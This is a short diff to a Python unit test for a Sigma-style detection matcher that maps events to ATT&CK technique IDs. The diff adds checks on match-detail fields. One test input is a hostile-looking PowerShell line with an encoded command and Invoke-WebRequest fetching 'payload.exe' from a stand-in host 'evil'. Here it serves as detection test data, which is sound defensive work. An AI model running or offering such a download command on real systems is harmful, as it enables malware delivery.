@@ -70,13 +70,19 @@ class IngestionPipelineTests(unittest.TestCase):
         self.assertEqual(generic_event["dest_ip"], "10.0.0.8")
 
     def test_sigma_matcher_returns_unique_technique_ids(self):
-        matches = SigmaMatcher().match_event(
+        matcher = SigmaMatcher()
+        matches = matcher.match_event(
             "powershell.exe -EncodedCommand AAAA Invoke-WebRequest http://evil/payload.exe"
         )
 
         self.assertIn("T1059.001", matches)
         self.assertIn("T1105", matches)
         self.assertEqual(len(matches), len(set(matches)))
+
+        details = matcher.match_event_details("powershell.exe -EncodedCommand AAAA")
+        self.assertEqual(details[0]["schema_version"], "raptor-sigma-lite-v2")
+        self.assertIn("rule_id", details[0])
+        self.assertIn("logsource", details[0])
 
     def test_normalizer_enriches_events_and_scores_iocs(self):
         content = json.dumps(
